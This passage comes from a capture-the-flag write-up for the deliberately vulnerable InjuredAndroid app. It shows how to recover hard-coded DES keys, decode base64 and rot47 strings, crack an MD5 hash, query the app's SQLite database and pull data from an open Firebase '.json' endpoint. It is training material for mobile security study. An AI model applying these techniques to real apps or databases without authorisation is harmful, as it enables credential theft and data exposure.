class=\"o\">/*</span> <span class=\"n\">renamed</span> <span class=\"k\">from</span><span class=\"p\">:</span> <span class=\"n\">b</span>  <span class=\"n\">reason</span><span class=\"p\">:</span> <span class=\"n\">collision</span> <span class=\"k\">with</span> <span class=\"n\">root</span> <span class=\"n\">package</span> <span class=\"n\">name</span> <span class=\"o\">*/</span>    <span class=\"n\">private</span> <span class=\"n\">static</span> <span class=\"n\">byte</span><span class=\"p\">[]</span> <span class=\"n\">f1470b</span> <span class=\"o\">=</span> <span class=\"n\">Base64</span><span class=\"p\">.</span><span class=\"nf\">decode</span><span class=\"p\">(</span><span class=\"sh\">\"</span><span class=\"s\">e0NhcHR1cjNUaDFzVG9vfQ==</span><span class=\"sh\">\"</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">);</span>    <span class=\"o\">/*</span> <span class=\"n\">renamed</span> <span class=\"k\">from</span><span class=\"p\">:</span> <span class=\"n\">c</span>  <span class=\"n\">reason</span><span class=\"p\">:</span> <span class=\"n\">collision</span> <span class=\"k\">with</span> <span class=\"n\">root</span> <span class=\"n\">package</span> <span class=\"n\">name</span> <span class=\"o\">*/</span>    <span class=\"n\">private</span> <span class=\"n\">static</span> <span class=\"n\">String</span> <span class=\"n\">f1471c</span> <span class=\"o\">=</span> <span class=\"sh\">\"</span><span class=\"s\">9EEADi^^:?;FC652?5C@:5]7:C632D6:@]4@&gt;^DB=:E6];D@?</span><span class=\"sh\">\"</span><span class=\"p\">;</span>    <span class=\"o\">/*</span> <span class=\"n\">JADX</span> <span class=\"n\">INFO</span><span class=\"p\">:</span> <span class=\"n\">Access</span> <span class=\"n\">modifiers</span> <span class=\"n\">changed</span> <span class=\"k\">from</span><span class=\"p\">:</span> <span class=\"n\">package</span><span class=\"o\">-</span><span class=\"n\">private</span> <span class=\"o\">*/</span>    <span class=\"n\">public</span> <span class=\"n\">static</span> <span class=\"n\">byte</span><span class=\"p\">[]</span> <span class=\"nf\">a</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"k\">return</span> <span class=\"n\">f1470b</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"o\">/*</span> <span class=\"n\">JADX</span> <span class=\"n\">INFO</span><span class=\"p\">:</span> <span class=\"n\">Access</span> <span class=\"n\">modifiers</span> <span class=\"n\">changed</span> <span class=\"k\">from</span><span class=\"p\">:</span> <span class=\"n\">package</span><span class=\"o\">-</span><span class=\"n\">private</span> <span class=\"o\">*/</span>    <span class=\"n\">public</span> <span class=\"n\">static</span> <span class=\"n\">byte</span><span class=\"p\">[]</span> <span class=\"nf\">b</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"k\">return</span> <span class=\"n\">f1469a</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"o\">/*</span> <span class=\"n\">JADX</span> <span class=\"n\">INFO</span><span class=\"p\">:</span> <span class=\"n\">Access</span> <span class=\"n\">modifiers</span> <span class=\"n\">changed</span> <span class=\"k\">from</span><span class=\"p\">:</span> <span class=\"n\">package</span><span class=\"o\">-</span><span class=\"n\">private</span> <span class=\"o\">*/</span>    <span class=\"n\">public</span> <span class=\"n\">static</span> <span class=\"n\">String</span> <span class=\"nf\">c</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"k\">return</span> <span class=\"n\">f1471c</span><span class=\"p\">;</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p><code class=\"language-plaintext highlighter-rouge\">b()</code> is returning <code class=\"language-plaintext highlighter-rouge\">f1469a</code> which is simply base64 decoding <code class=\"language-plaintext highlighter-rouge\">\"Q2FwdHVyM1RoMXM=\"</code>.</p><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">echo</span> <span class=\"sh\">\"</span><span class=\"s\">Q2FwdHVyM1RoMXM=</span><span class=\"sh\">\"</span> <span class=\"o\">|</span> <span class=\"n\">base64</span> <span class=\"o\">--</span><span class=\"n\">decode</span><span class=\"n\">Captur3Th1s</span></code></pre></div></div><p>Now that we have the <code class=\"language-plaintext highlighter-rouge\">DESKeySpec()</code> key we can reverse the encryption process.</p><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"kn\">import</span> <span class=\"n\">base64</span><span class=\"kn\">from</span> <span class=\"n\">Crypto.Cipher</span> <span class=\"kn\">import</span> <span class=\"n\">DES</span><span class=\"n\">key</span> <span class=\"o\">=</span> <span class=\"sh\">\"</span><span class=\"s\">Captur3Th1s</span><span class=\"sh\">\"</span><span class=\"n\">encodedString</span> <span class=\"o\">=</span> <span class=\"sh\">\"</span><span class=\"s\">k3FElEG9lnoWbOateGhj5pX6QsXRNJKh///8Jxi8KXW7iDpk2xRxhQ==</span><span class=\"sh\">\"</span><span class=\"n\">keyByte</span> <span class=\"o\">=</span> <span class=\"n\">key</span><span class=\"p\">[:</span><span class=\"mi\">8</span><span class=\"p\">].</span><span class=\"nf\">encode</span><span class=\"p\">(</span><span class=\"sh\">'</span><span class=\"s\">utf-8</span><span class=\"sh\">'</span><span class=\"p\">)</span><span class=\"n\">stringByte</span> <span class=\"o\">=</span> <span class=\"n\">base64</span><span class=\"p\">.</span><span class=\"nf\">b64decode</span><span class=\"p\">(</span><span class=\"n\">encodedString</span><span class=\"p\">)</span><span class=\"n\">desReverse</span> <span class=\"o\">=</span> <span class=\"n\">DES</span><span class=\"p\">.</span><span class=\"nf\">new</span><span class=\"p\">(</span><span class=\"n\">keyByte</span><span class=\"p\">,</span> <span class=\"n\">DES</span><span class=\"p\">.</span><span class=\"n\">MODE_ECB</span><span class=\"p\">)</span><span class=\"nf\">print</span><span class=\"p\">(</span><span class=\"n\">desReverse</span><span class=\"p\">.</span><span class=\"nf\">decrypt</span><span class=\"p\">(</span><span class=\"n\">stringByte</span><span class=\"p\">))</span></code></pre></div></div><p>We will then receive <code class=\"language-plaintext highlighter-rouge\">b\"{This_Isn't_Where_I_Parked_My_Car}\\x06\\x06\\x06\\x06\\x06\\x06\"</code>.</p><p>Ignoring the trailing bytes we have our answer.</p><h1 id=\"flag-seven-sqlite\">Flag Seven: SQLite</h1><p><code class=\"language-plaintext highlighter-rouge\">FlagSevenSqliteActivity</code></p><p>Once we open the activity a SQLite database named <code class=\"language-plaintext highlighter-rouge\">Thisisatest</code> is created. <code class=\"language-plaintext highlighter-rouge\">contentValues.put(”title”, )</code> &amp; <code class=\"language-plaintext highlighter-rouge\">contentValues.put(”subtitle”, )</code> are being used to provide the data to be inserted into the database.</p><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nd\">@Override</span> <span class=\"o\">//</span> <span class=\"n\">androidx</span><span class=\"p\">.</span><span class=\"n\">appcompat</span><span class=\"p\">.</span><span class=\"n\">app</span><span class=\"p\">.</span><span class=\"n\">c</span><span class=\"p\">,</span> <span class=\"n\">androidx</span><span class=\"p\">.</span><span class=\"n\">fragment</span><span class=\"p\">.</span><span class=\"n\">app</span><span class=\"p\">.</span><span class=\"n\">d</span><span class=\"p\">,</span> <span class=\"n\">androidx</span><span class=\"p\">.</span><span class=\"n\">activity</span><span class=\"p\">.</span><span class=\"n\">ComponentActivity</span><span class=\"p\">,</span> <span class=\"n\">androidx</span><span class=\"p\">.</span><span class=\"n\">core</span><span class=\"p\">.</span><span class=\"n\">app</span><span class=\"p\">.</span><span class=\"n\">e</span><span class=\"p\">,</span> <span class=\"n\">android</span><span class=\"p\">.</span><span class=\"n\">app</span><span class=\"p\">.</span><span class=\"n\">Activity</span>    <span class=\"n\">public</span> <span class=\"n\">void</span> <span class=\"nf\">onCreate</span><span class=\"p\">(</span><span class=\"n\">Bundle</span> <span class=\"n\">bundle</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"nb\">super</span><span class=\"p\">.</span><span class=\"nf\">onCreate</span><span class=\"p\">(</span><span class=\"n\">bundle</span><span class=\"p\">);</span>        <span class=\"nf\">setContentView</span><span class=\"p\">(</span><span class=\"n\">R</span><span class=\"p\">.</span><span class=\"n\">layout</span><span class=\"p\">.</span><span class=\"n\">activity_flag_seven_sqlite</span><span class=\"p\">);</span>        <span class=\"nc\">C</span><span class=\"p\">((</span><span class=\"n\">Toolbar</span><span class=\"p\">)</span> <span class=\"nf\">findViewById</span><span class=\"p\">(</span><span class=\"n\">R</span><span class=\"p\">.</span><span class=\"nb\">id</span><span class=\"p\">.</span><span class=\"n\">toolbar</span><span class=\"p\">));</span>        <span class=\"n\">j</span><span class=\"p\">.</span><span class=\"n\">j</span><span class=\"p\">.</span><span class=\"nf\">a</span><span class=\"p\">(</span><span class=\"n\">this</span><span class=\"p\">);</span>        <span class=\"nc\">H</span><span class=\"p\">();</span>        <span class=\"p\">((</span><span class=\"n\">FloatingActionButton</span><span class=\"p\">)</span> <span class=\"nf\">findViewById</span><span class=\"p\">(</span><span class=\"n\">R</span><span class=\"p\">.</span><span class=\"nb\">id</span><span class=\"p\">.</span><span class=\"n\">fab</span><span class=\"p\">)).</span><span class=\"nf\">setOnClickListener</span><span class=\"p\">(</span><span class=\"n\">new</span> <span class=\"nf\">a</span><span class=\"p\">());</span>        <span class=\"n\">SQLiteDatabase</span> <span class=\"n\">writableDatabase</span> <span class=\"o\">=</span> <span class=\"n\">this</span><span class=\"p\">.</span><span class=\"n\">x</span><span class=\"p\">.</span><span class=\"nf\">getWritableDatabase</span><span class=\"p\">();</span>        <span class=\"n\">ContentValues</span> <span class=\"n\">contentValues</span> <span class=\"o\">=</span> <span class=\"n\">new</span> <span class=\"nc\">ContentValues</span><span class=\"p\">();</span>        <span class=\"n\">contentValues</span><span class=\"p\">.</span><span class=\"nf\">put</span><span class=\"p\">(</span><span class=\"sh\">\"</span><span class=\"s\">title</span><span class=\"sh\">\"</span><span class=\"p\">,</span> <span class=\"n\">Base64</span><span class=\"p\">.</span><span class=\"nf\">decode</span><span class=\"p\">(</span><span class=\"sh\">\"</span><span class=\"s\">VGhlIGZsYWcgaGFzaCE=</span><span class=\"sh\">\"</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">));</span>        <span class=\"n\">contentValues</span><span class=\"p\">.</span><span class=\"nf\">put</span><span class=\"p\">(</span><span class=\"sh\">\"</span><span class=\"s\">subtitle</span><span class=\"sh\">\"</span><span class=\"p\">,</span> <span class=\"n\">Base64</span><span class=\"p\">.</span><span class=\"nf\">decode</span><span class=\"p\">(</span><span class=\"sh\">\"</span><span class=\"s\">MmFiOTYzOTBjN2RiZTM0MzlkZTc0ZDBjOWIwYjE3Njc=</span><span class=\"sh\">\"</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">));</span>        <span class=\"n\">writableDatabase</span><span class=\"p\">.</span><span class=\"nf\">insert</span><span class=\"p\">(</span><span class=\"sh\">\"</span><span class=\"s\">Thisisatest</span><span class=\"sh\">\"</span><span class=\"p\">,</span> <span class=\"n\">null</span><span class=\"p\">,</span> <span class=\"n\">contentValues</span><span class=\"p\">);</span>        <span class=\"n\">contentValues</span><span class=\"p\">.</span><span class=\"nf\">put</span><span class=\"p\">(</span><span class=\"sh\">\"</span><span class=\"s\">title</span><span class=\"sh\">\"</span><span class=\"p\">,</span> <span class=\"n\">Base64</span><span class=\"p\">.</span><span class=\"nf\">decode</span><span class=\"p\">(</span><span class=\"sh\">\"</span><span class=\"s\">VGhlIGZsYWcgaXMgYWxzbyBhIHBhc3N3b3JkIQ==</span><span class=\"sh\">\"</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">));</span>        <span class=\"n\">contentValues</span><span class=\"p\">.</span><span class=\"nf\">put</span><span class=\"p\">(</span><span class=\"sh\">\"</span><span class=\"s\">subtitle</span><span class=\"sh\">\"</span><span class=\"p\">,</span> <span class=\"n\">h</span><span class=\"p\">.</span><span class=\"nf\">c</span><span class=\"p\">());</span>        <span class=\"n\">writableDatabase</span><span class=\"p\">.</span><span class=\"nf\">insert</span><span class=\"p\">(</span><span class=\"sh\">\"</span><span class=\"s\">Thisisatest</span><span class=\"sh\">\"</span><span class=\"p\">,</span> <span class=\"n\">null</span><span class=\"p\">,</span> <span class=\"n\">contentValues</span><span class=\"p\">);</span>    <span class=\"p\">}</span></code></pre></div></div><p>For the first row in the database both the <code class=\"language-plaintext highlighter-rouge\">“title”</code> and <code class=\"language-plaintext highlighter-rouge\">“subtitle”</code> are base64 decoded version of their associated hard-coded string.</p><div class=\"language-jsx highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nx\">contentValues</span><span class=\"p\">.</span><span class=\"nf\">put</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">title</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"nx\">Base64</span><span class=\"p\">.</span><span class=\"nf\">decode</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">VGhlIGZsYWcgaGFzaCE=</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">));</span><span class=\"nx\">contentValues</span><span class=\"p\">.</span><span class=\"nf\">put</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">subtitle</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"nx\">Base64</span><span class=\"p\">.</span><span class=\"nf\">decode</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">MmFiOTYzOTBjN2RiZTM0MzlkZTc0ZDBjOWIwYjE3Njc=</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">));</span><span class=\"nx\">writableDatabase</span><span class=\"p\">.</span><span class=\"nf\">insert</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">Thisisatest</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"kc\">null</span><span class=\"p\">,</span> <span class=\"nx\">contentValues</span><span class=\"p\">);</span></code></pre></div></div><p>Base64 decoding both we receive the following:</p><div class=\"language-jsx highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nx\">title</span><span class=\"p\">:</span> <span class=\"nx\">echo</span> <span class=\"dl\">\"</span><span class=\"s2\">VGhlIGZsYWcgaGFzaCE=</span><span class=\"dl\">\"</span> <span class=\"o\">|</span> <span class=\"nx\">base64</span> <span class=\"o\">--</span><span class=\"nx\">decode</span><span class=\"nx\">The</span> <span class=\"nx\">flag</span> <span class=\"nx\">hash</span><span class=\"o\">!</span><span class=\"nx\">subtitle</span><span class=\"p\">:</span> <span class=\"nx\">echo</span> <span class=\"dl\">\"</span><span class=\"s2\">MmFiOTYzOTBjN2RiZTM0MzlkZTc0ZDBjOWIwYjE3Njc=</span><span class=\"dl\">\"</span> <span class=\"o\">|</span> <span class=\"nx\">base64</span> <span class=\"o\">--</span><span class=\"nx\">decode</span><span class=\"mi\">2</span><span class=\"nx\">ab96390c7dbe3439de74d0c9b0b1767</span></code></pre></div></div><p>However for the second row the <code class=\"language-plaintext highlighter-rouge\">“title”</code> is a base64 decoded version of its associated string but the <code class=\"language-plaintext highlighter-rouge\">“subtitle”</code> is <code class=\"language-plaintext highlighter-rouge\">h.c()</code>.</p><div class=\"language-jsx highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nx\">contentValues</span><span class=\"p\">.</span><span class=\"nf\">put</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">title</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"nx\">Base64</span><span class=\"p\">.</span><span class=\"nf\">decode</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">VGhlIGZsYWcgaXMgYWxzbyBhIHBhc3N3b3JkIQ==</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">));</span><span class=\"nx\">contentValues</span><span class=\"p\">.</span><span class=\"nf\">put</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">subtitle</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"nx\">h</span><span class=\"p\">.</span><span class=\"nf\">c</span><span class=\"p\">());</span><span class=\"nx\">writableDatabase</span><span class=\"p\">.</span><span class=\"nf\">insert</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">Thisisatest</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"kc\">null</span><span class=\"p\">,</span> <span class=\"nx\">contentValues</span><span class=\"p\">);</span></code></pre></div></div><p>Base64 decoding the <code class=\"language-plaintext highlighter-rouge\">“title”</code> we receive the following:</p><div class=\"language-jsx highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nx\">title</span><span class=\"p\">:</span> <span class=\"nx\">echo</span> <span class=\"dl\">\"</span><span class=\"s2\">VGhlIGZsYWcgaXMgYWxzbyBhIHBhc3N3b3JkIQ==</span><span class=\"dl\">\"</span> <span class=\"o\">|</span> <span class=\"nx\">base64</span> <span class=\"o\">--</span><span class=\"nx\">decode</span><span class=\"nx\">The</span> <span class=\"nx\">flag</span> <span class=\"nx\">is</span> <span class=\"nx\">also</span> <span class=\"nx\">a</span> <span class=\"nx\">password</span><span class=\"o\">!</span></code></pre></div></div><p>Wanting to know what is being supplied from <code class=\"language-plaintext highlighter-rouge\">h.c()</code> I decided to use use sqlite3 to interact with the database.</p><div class=\"language-jsx highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nx\">emu64xa</span><span class=\"p\">:</span><span class=\"o\">/</span><span class=\"nx\">data</span><span class=\"o\">/</span><span class=\"nx\">data</span><span class=\"o\">/</span><span class=\"nx\">b3nac</span><span class=\"p\">.</span><span class=\"nx\">injuredandroid</span><span class=\"o\">/</span><span class=\"nx\">databases</span> <span class=\"err\">#</span> <span class=\"nx\">sqlite3</span> <span class=\"nx\">Thisisatest</span><span class=\"p\">.</span><span class=\"nx\">db</span><span class=\"nx\">SQLite</span> <span class=\"nx\">version</span> <span class=\"mf\">3.32</span><span class=\"p\">.</span><span class=\"mi\">2</span> <span class=\"mi\">2021</span><span class=\"o\">-</span><span class=\"mi\">07</span><span class=\"o\">-</span><span class=\"mi\">12</span> <span class=\"mi\">15</span><span class=\"p\">:</span><span class=\"mi\">00</span><span class=\"p\">:</span><span class=\"mi\">17</span><span class=\"nx\">Enter</span> <span class=\"dl\">\"</span><span class=\"s2\">.help</span><span class=\"dl\">\"</span> <span class=\"k\">for</span> <span class=\"nx\">usage</span> <span class=\"nx\">hints</span><span class=\"p\">.</span><span class=\"nx\">sqlite</span><span class=\"o\">&gt;</span> <span class=\"p\">.</span><span class=\"nx\">tables</span><span class=\"nx\">Thisisatest</span>       <span class=\"nx\">android_metadata</span><span class=\"nx\">sqlite</span><span class=\"o\">&gt;</span> <span class=\"nx\">SELECT</span> <span class=\"o\">*</span> <span class=\"nx\">FROM</span> <span class=\"nx\">Thisisatest</span><span class=\"p\">;</span><span class=\"mi\">1</span><span class=\"o\">|</span><span class=\"nx\">The</span> <span class=\"nx\">flag</span> <span class=\"nx\">hash</span><span class=\"o\">!|</span><span class=\"mi\">2</span><span class=\"nx\">ab96390c7dbe3439de74d0c9b0b1767</span><span class=\"mi\">2</span><span class=\"o\">|</span><span class=\"nx\">The</span> <span class=\"nx\">flag</span> <span class=\"nx\">is</span> <span class=\"nx\">also</span> <span class=\"nx\">a</span> <span class=\"nx\">password</span><span class=\"o\">!|</span><span class=\"mi\">9</span><span class=\"nx\">EEADi</span><span class=\"o\">^^</span><span class=\"p\">:?;</span><span class=\"nx\">FC652</span><span class=\"p\">?</span><span class=\"mi\">5</span><span class=\"nx\">C</span><span class=\"p\">@:</span><span class=\"mi\">5</span><span class=\"p\">]</span><span class=\"mi\">7</span><span class=\"p\">:</span><span class=\"nx\">C632D6</span><span class=\"p\">:@]</span><span class=\"mi\">4</span><span class=\"p\">@</span><span class=\"o\">&gt;^</span><span class=\"nx\">DB</span><span class=\"o\">=</span><span class=\"p\">:</span><span class=\"nx\">E6</span><span class=\"p\">];</span><span class=\"nx\">D</span><span class=\"p\">@?</span></code></pre></div></div><p>So the string <code class=\"language-plaintext highlighter-rouge\">2ab96390c7dbe3439de74d0c9b0b1767</code> from row 1 is a hash. Lets see if we can crack it. Using hashid we can quickly verify that it is likely to be a MD5 hash.</p><div class=\"language-jsx highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nx\">hashid</span> <span class=\"mi\">2</span><span class=\"nx\">ab96390c7dbe3439de74d0c9b0b1767</span><span class=\"nx\">Analyzing</span> <span class=\"dl\">'</span><span class=\"s1\">2ab96390c7dbe3439de74d0c9b0b1767</span><span class=\"dl\">'</span><span class=\"p\">[</span><span class=\"o\">+</span><span class=\"p\">]</span> <span class=\"nx\">MD2</span> <span class=\"p\">[</span><span class=\"o\">+</span><span class=\"p\">]</span> <span class=\"nx\">MD5</span> <span class=\"p\">[</span><span class=\"o\">+</span><span class=\"p\">]</span> <span class=\"nx\">MD4</span></code></pre></div></div><p>Thanks to CrackStation we didn’t even need to open hashcat.</p><div class=\"language-jsx highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nx\">Hash</span>\t                           <span class=\"nx\">Type</span>\t<span class=\"nx\">Result</span><span class=\"mi\">2</span><span class=\"nx\">ab96390c7dbe3439de74d0c9b0b1767</span>\t<span class=\"nx\">md5</span>\t<span class=\"nx\">hunter2</span></code></pre></div></div><p>Now onto row 2 we could look into <code class=\"language-plaintext highlighter-rouge\">h.c()</code> but lets see if we can get an easy win first. Using ciphey we uncover the plaintext version of the string.</p><div class=\"language-jsx highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nx\">docker</span> <span class=\"nx\">run</span> <span class=\"o\">-</span><span class=\"nx\">it</span> <span class=\"o\">--</span><span class=\"nx\">rm</span> <span class=\"nx\">remnux</span><span class=\"o\">/</span><span class=\"nx\">ciphey</span> <span class=\"dl\">\"</span><span class=\"s2\">9EEADi^^:?;FC652?5C@:5]7:C632D6:@]4@&gt;^DB=:E6];D@?</span><span class=\"dl\">\"</span><span class=\"nx\">Possible</span> <span class=\"nx\">plaintext</span><span class=\"p\">:</span> <span class=\"dl\">'</span><span class=\"s1\">https://injuredandroid.firebaseio.com/sqlite.json</span><span class=\"dl\">'</span> <span class=\"p\">(</span><span class=\"nx\">y</span><span class=\"o\">/</span><span class=\"nx\">N</span><span class=\"p\">):</span> <span class=\"nx\">y</span><span class=\"err\">╭───────────────────────────────────────────────────────────────────────────╮</span><span class=\"err\">│</span> <span class=\"nx\">The</span> <span class=\"nx\">plaintext</span> <span class=\"nx\">is</span> <span class=\"nx\">a</span> <span class=\"nx\">Uniform</span> <span class=\"nx\">Resource</span> <span class=\"nc\">Locator </span><span class=\"p\">(</span><span class=\"nx\">URL</span><span class=\"p\">)</span>                         <span class=\"err\">│</span><span class=\"err\">│</span> <span class=\"nx\">Formats</span> <span class=\"nx\">used</span><span class=\"p\">:</span>                                                             <span class=\"err\">│</span><span class=\"err\">│</span>    <span class=\"nx\">rot47</span><span class=\"p\">:</span>                                                                 <span class=\"err\">│</span><span class=\"err\">│</span>     <span class=\"nx\">Key</span><span class=\"p\">:</span> <span class=\"mi\">47</span><span class=\"nx\">Plaintext</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">https://injuredandroid.firebaseio.com/sqlite.json</span><span class=\"dl\">\"</span> <span class=\"err\">│</span><span class=\"err\">╰───────────────────────────────────────────────────────────────────────────╯</span></code></pre></div></div><p>Lastly, running opening the URL we can get the last part of the puzzle.</p><div class=\"language-jsx highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code> <span class=\"nx\">curl</span> <span class=\"nx\">https</span><span class=\"p\">:</span><span class=\"c1\">//injuredandroid.firebaseio.com/sqlite.json</span><span class=\"dl\">\"</span><span class=\"s2\">S3V3N_11</span><span class=\"dl\">\"</span></code></pre></div></div><h1 id=\"flag-eight-aws\">Flag Eight: AWS</h1><p><code class=\"language-plaintext highlighter-rouge\">FlagEightLoginActivity</code></p><p>On top of searching for AWS and the string names I ran trufflehog but did not find any strings that match any AWS patterns or anything similar. For sanity sake I looked at another write-up of this app which in their case they found the AWS credentials within strings.xml.</p><p>Looking into strings.xml we find two spaces for AWS credentials to be in but no info is shown for these lines. For whatever reason those credentials are no longer in this app.</p><div class=\"language-jsx highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"p\">&lt;</span><span class=\"nt\">string</span> <span class=\"na\">name</span><span class=\"p\">=</span><span class=\"s\">\"AWS_ID\"</span> <span class=\"p\">/&gt;</span><span class=\"p\">&lt;</span><span class=\"nt\">string</span> <span class=\"na\">name</span><span class=\"p\">=</span><span class=\"s\">\"AWS_SECRET\"</span> <span class=\"p\">/&gt;</span></code></pre></div></div><h1 id=\"flag-nine-firebase\">Flag Nine: Firebase</h1><p><code class=\"language-plaintext highlighter-rouge\">FlagNineFirebaseActivity</code></p><p>This activity gives a rather helpful hint, “Use the .json trick with database url”. A quick Google search we can find an article provided in hacktricks. <a href=\"https://cloud.hacktricks.xyz/pentesting-cloud/gcp-security/gcp-services/gcp-databases-enum/gcp-firebase-enum\">https://cloud.hacktricks.xyz/pentesting-cloud/gcp-security/gcp-services/gcp-databases-enum/gcp-firebase-enum</a></p><p>First up we will need to find the Firebase URL e can go ahead and grep for Firebase or alternatively if we provide the APK to MobSF the Firebase URL will automatically be located for us. Either way the Firebase URL is located in the strings.xml file.</p><p><code class=\"language-plaintext highlighter-rouge\">&lt;string name=\"firebase_database_url\"&gt;https://injuredandroid.firebaseio.com&lt;/string&gt;</code></p><p>Now that we have the URL lets see what we need to trigger the flag. <code class=\"language-plaintext highlighter-rouge\">b()</code> shows us that if <code class=\"language-plaintext highlighter-rouge\">this.f1456b</code>, which is our user supplied string, is equal to the string from <code class=\"language-plaintext highlighter-rouge\">aVar.c()</code> then the flag will be triggered. Since <code class=\"language-plaintext highlighter-rouge\">aVar</code> is from the Firebase database lets look into the database itself.</p><div class=\"language-jsx highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"kr\">public</span> <span class=\"k\">void</span> <span class=\"nf\">b</span><span class=\"p\">(</span><span class=\"nx\">com</span><span class=\"p\">.</span><span class=\"nx\">google</span><span class=\"p\">.</span><span class=\"nx\">firebase</span><span class=\"p\">.</span><span class=\"nx\">database</span><span class=\"p\">.</span><span class=\"nx\">a</span> <span class=\"nx\">aVar</span><span class=\"p\">)</span> <span class=\"p\">{</span>            <span class=\"nx\">d</span><span class=\"p\">.</span><span class=\"nx\">s</span><span class=\"p\">.</span><span class=\"nx\">d</span><span class=\"p\">.</span><span class=\"nx\">g</span><span class=\"p\">.</span><span class=\"nf\">e</span><span class=\"p\">(</span><span class=\"nx\">aVar</span><span class=\"p\">,</span> <span class=\"dl\">\"</span><span class=\"s2\">dataSnapshot</span><span class=\"dl\">\"</span><span class=\"p\">);</span>            <span class=\"k\">if </span><span class=\"p\">(</span><span class=\"o\">!</span><span class=\"nx\">d</span><span class=\"p\">.</span><span class=\"nx\">s</span><span class=\"p\">.</span><span class=\"nx\">d</span><span class=\"p\">.</span><span class=\"nx\">g</span><span class=\"p\">.</span><span class=\"nf\">a</span><span class=\"p\">(</span><span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">f1456b</span><span class=\"p\">,</span> <span class=\"p\">(</span><span class=\"nb\">String</span><span class=\"p\">)</span> <span class=\"nx\">aVar</span><span class=\"p\">.</span><span class=\"nf\">c</span><span class=\"p\">()))</span> <span class=\"p\">{</span>                <span class=\"nx\">Toast</span><span class=\"p\">.</span><span class=\"nf\">makeText</span><span class=\"p\">(</span><span class=\"nx\">FlagNineFirebaseActivity</span><span class=\"p\">.</span><span class=\"k\">this</span><span class=\"p\">,</span> <span class=\"dl\">\"</span><span class=\"s2\">Try again! :D</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">).</span><span class=\"nf\">show</span><span class=\"p\">();</span>                <span class=\"k\">return</span><span class=\"p\">;</span>            <span class=\"p\">}</span>            <span class=\"nx\">FlagsOverview</span><span class=\"p\">.</span><span class=\"nx\">J</span> <span class=\"o\">=</span> <span class=\"kc\">true</span><span class=\"p\">;</span>            <span class=\"nx\">j</span> <span class=\"nx\">jVar</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nf\">j</span><span class=\"p\">();</span>            <span class=\"nx\">Context</span> <span class=\"nx\">applicationContext</span> <span class=\"o\">=</span> <span class=\"nx\">FlagNineFirebaseActivity</span><span class=\"p\">.</span><span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nf\">getApplicationContext</span><span class=\"p\">();</span>            <span class=\"nx\">d</span><span class=\"p\">.</span><span class=\"nx\">s</span><span class=\"p\">.</span><span class=\"nx\">d</span><span class=\"p\">.</span><span class=\"nx\">g</span><span class=\"p\">.</span><span class=\"nf\">d</span><span class=\"p\">(</span><span class=\"nx\">applicationContext</span><span class=\"p\">,</span> <span class=\"dl\">\"</span><span class=\"s2\">applicationContext</span><span class=\"dl\">\"</span><span class=\"p\">);</span>            <span class=\"nx\">jVar</span><span class=\"p\">.</span><span class=\"nf\">b</span><span class=\"p\">(</span><span class=\"nx\">applicationContext</span><span class=\"p\">,</span> <span class=\"dl\">\"</span><span class=\"s2\">flagNineButtonColor</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"kc\">true</span><span class=\"p\">);</span>            <span class=\"nx\">FlagNineFirebaseActivity</span><span class=\"p\">.</span><span class=\"k\">this</span><span 